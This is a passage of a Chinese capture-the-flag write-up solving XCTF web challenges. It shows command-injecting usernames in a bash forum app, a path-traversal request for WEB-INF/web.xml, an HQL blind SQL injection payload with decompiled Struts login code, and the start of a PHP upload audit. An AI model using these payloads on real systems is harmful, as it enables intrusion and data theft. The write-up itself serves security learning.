$&#123;pathname&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> pMax <span class="keyword">include</span> depth exceeded!p</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续观察，发现reply函数也存在路径穿越漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reply</span> </span>&#123;</span><br><span class="line">    local post_id=$<span class="number">1</span>;</span><br><span class="line">    local username=$<span class="number">2</span>;</span><br><span class="line">    local text=$<span class="number">3</span>;</span><br><span class="line">    local hashed=$(hash_username <span class="string">&quot;$&#123;username&#125;&quot;</span>);</span><br><span class="line">    curr_id=$(<span class="keyword">for</span> d in posts/$&#123;post_id&#125;<span class="comment">/*; do basename $d; done | sort -n | tail -n 1);</span></span><br><span class="line"><span class="comment">    next_reply_id=$(awk &#x27;&#123;print $1+1&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;curr_id&#125;&quot;);</span></span><br><span class="line"><span class="comment">    next_file=(posts/$&#123;post_id&#125;/$&#123;next_reply_id&#125;);</span></span><br><span class="line"><span class="comment">    echo &quot;$&#123;username&#125;&quot; &gt; &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">    echo &quot;RE: $(nth_line 2 &lt; &quot;posts/$&#123;post_id&#125;/1&quot;)&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">    echo &quot;$&#123;text&#125;&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">    # add post this is in reply to to posts cache</span></span><br><span class="line"><span class="comment">    echo &quot;$&#123;post_id&#125;/$&#123;next_reply_id&#125;&quot; &gt;&gt; &quot;users_lookup/$&#123;hashed&#125;/posts&quot;;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>上面标记的一行代码把用户名写在了评论文件的内容中。</p><p>结合上面两段代码和黄色重点标记的部分，我们可以推测如果用户名是一段可执行代码，同时写入wtf格式文件，那么这个文件就能够执行我们想要的代码。</p><p>由得到前半段flag的文件get_flag1推测，后半段flag的文件名应为get_flag2，于是我们先注册一个用户名为<code>\$&#123;find,/,-iname,get_flag2&#125;</code>的普通用户，用来寻找所有目录下的get_flag2文件。然后我们测试一下前面提到的文件上传漏洞。将post路径改为如下所示，上传名为test1.wtf的文件，在这里文件的内容没有意义，执行的是USERNAME，即<code>\$&#123;find,/,-iname,get_flag2&#125;</code>，用来寻找flag2路径.</p><p><img src="/img/88f14ee2803cedf895270ab6bbcba866.png"></p><p>上传成功后我们打开这个文件，可以得到flag2的路径：</p><p><img src="/img/10f2caf48d231a51678cb63b027d0a2a.png"></p><p>下面我们利用这个路径得到flag2。注册一个名为<code>\$/usr/bin/get_flag2</code>的用户，利用以上方法上传attack.wtf文件：</p><p><img src="/img/b20da88afa4c44ee711c4fa029f64677.png"></p><p>打开该文件，得到flag2。</p><p><img src="/img/e0a3e915117dbf6eabbb3ec1d970468b.png"></p><p>拼接flag1和flag2得到xctf{cb49256d1ab48803149e5ec49d3c29ca}.</p><h2 id="Zhuanxv-（难度：7-10）"><a href="#Zhuanxv-（难度：7-10）" class="headerlink" title="Zhuanxv （难度：7/10）"></a>Zhuanxv （难度：7/10）</h2><p>结合题目描述中的“你只是在扫描目标端口的时候发现了一个开放的web服务”，使用webdirscan工具扫描一下，得到以下结果：</p><p><img src="/img/fcc72f547692369aa6041d550264c158.png"></p><p>打开<a href="http://111.200.241.244:59982/list%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%9A">http://111.200.241.244:59982/list可以得到一个登录界面：</a></p><p><img src="/img/2d67ecd7dce7fce58e1717ffd986c0c7.png"></p><p>仔细审阅代码，发现疑似文件包含漏洞：</p><p><img src="/img/784206267500573fb86da08696200745.png"></p><p>同时发现cookie中含有<code>JESSIONID</code>字段：</p><p><img src="/img/18d717345b071e4c35e43f27b361c724.png"></p><p>于是怀疑该网页所用语言为Java，于是我们尝试利用上面的文件包含漏洞寻找web.xml页面。构造payload为<code>http://111.200.241.244:59982/loadimage?fileName=../../WEB-INF/web.xml</code>，访问，得到bg.jpg，用记事本打开，可以得到源代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">id</span>=<span class="string">&quot;WebApp_9&quot;</span> <span class="attr">version</span>=<span class="string">&quot;2.4&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Struts Blank<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/ctfpage/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/ctfpage/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现strust2文件，即Struts2框架的全局属性文件，利用文件包含漏洞访问该文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;strutsenableDynamicMethodInvocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.mapper.alwaysSelectFullNamespace&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.action.extension&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;front&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exception-mapping</span> <span class="attr">exception</span>=<span class="string">&quot;java.lang.Exception&quot;</span> <span class="attr">result</span>=<span class="string">&quot;error&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;zhuanxvlogin&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.UserLoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;loadimage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.DownloadAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;stream&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;contentType&quot;</span>&gt;</span>image/jpeg<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;contentDisposition&quot;</span>&gt;</span>attachment;filename=&quot;bg.jpg&quot;<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;inputName&quot;</span>&gt;</span>downloadFile<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;suffix_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;back&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.util.UserOAuth&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;list&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.AdminAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;excludeMethods&quot;</span>&gt;</span></span><br><span class="line">                    execute</span><br><span class="line">                <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;login_error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;list_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>文件里包含了很多class名，使用文件包含漏洞可以逐个下载。下载后将文件扩展名改为.class，用<code>jd-gui</code> java反编译工具进行反编译：</p><p><img src="/img/03edafc996c93920d2f0236ac05286fa.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">userCheck</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line"> List&lt;User&gt; userList = <span class="keyword">this</span>.userService.loginCheck(user.getName(), user.getPassword());</span><br><span class="line"> <span class="keyword">if</span> (userList != <span class="keyword">null</span> &amp;&amp; userList.size() == <span class="number">1</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> addActionError(<span class="string">&quot;Username or password is Wrong, please check!&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> List &lt;User&gt; loginCheck(String name, String password) &#123;</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    Matcher username_matcher = Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(name);</span><br><span class="line">    Matcher password_matcher = Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(password);</span><br><span class="line">    <span class="keyword">if</span> (password_matcher.find()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.userDao.loginCheck(name, password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> List &lt; User &gt; loginCheck(String name, String password) &#123;</span><br><span class="line">       <span class="keyword">return</span> getHibernateTemplate().find(<span class="string">&quot;from User where name =&#x27;&quot;</span> + name + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>);  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>以上代码片段是反编译后得到的登录和用户校验的代码，结合以上代码可以构造payload：<code>(select%0Aascii(substr(id,&quot;+str(i)+&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid\&lt;2)\&lt;&#39;&quot;+str(j)+&quot;&#39;</code>以及URL：”<code>%0Aor%0Aname%0Alike%0A&#39;admin&amp;user.password=1</code>“，使用脚本进行盲注，得到flag：<code>sctf&#123;C46E250926A2DFFD831975396222B08E&#125;</code>。</p><p><img src="/img/e612afe02edb8e93583c659b2d7359dd.png"></p><h2 id="blgdel-（难度：8-10）"><a href="#blgdel-（难度：8-10）" class="headerlink" title="blgdel （难度：8/10）"></a>blgdel （难度：8/10）</h2><p>首先使用御剑专业版扫描一下目录：</p><p><img src="/img/fe559a7ed170a262e055fef1679db42a.png"></p><p>打开/robots.txt文件后如图，指向了另一个网站路径：</p><p><img src="/img/593f27f33ea1a56d4e0a2e6f8e424d99.png"></p><p>打开后页面内包含了网站源代码，于是进行代码审计。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">master</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_open</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/(.*)\/(.*)$/s&#x27;</span>,<span class="variable">$path</span>,<span class="variable">$array</span>,<span class="number">0</span>,<span class="number">9</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$array</span>[<span class="number">1</span>];</span><br><span class="line">        parse_str(<span class="variable">$array</span>[<span class="number">2</span>],<span class="variable">$array</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$array</span>[<span class="string">&#x27;path&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path=<span class="variable">$array</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$array</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name=<span class="variable">$array</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;upload(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$a</span>===<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;search(<span class="keyword">$this</span>-&gt;path,<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^uploads\/[a-z]&#123;10&#125;\/$/is&#x27;</span>,<span class="variable">$path</span>)||<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="variable">$file</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">         </span><br><span class="line">        <span class="variable">$file</span>=str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=str_replace(urldecode(<span class="string">&#x27;%03&#x27;</span>),<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=str_replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file:|http|pre|etc/is&#x27;</span>,<span class="variable">$file</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;illegalbbbbbb!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        file_put_contents(<span class="variable">$path</span>.<span class="variable">$filename</span>,<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$path</span>.<span class="string">&#x27;user.jpg&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload success!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="variable">$path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;illegal!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$files</span>=scandir(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$files as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(str_ireplace(<span class="variable">$name</span>,<span class="string">&#x27;&#x27;</span>,<span 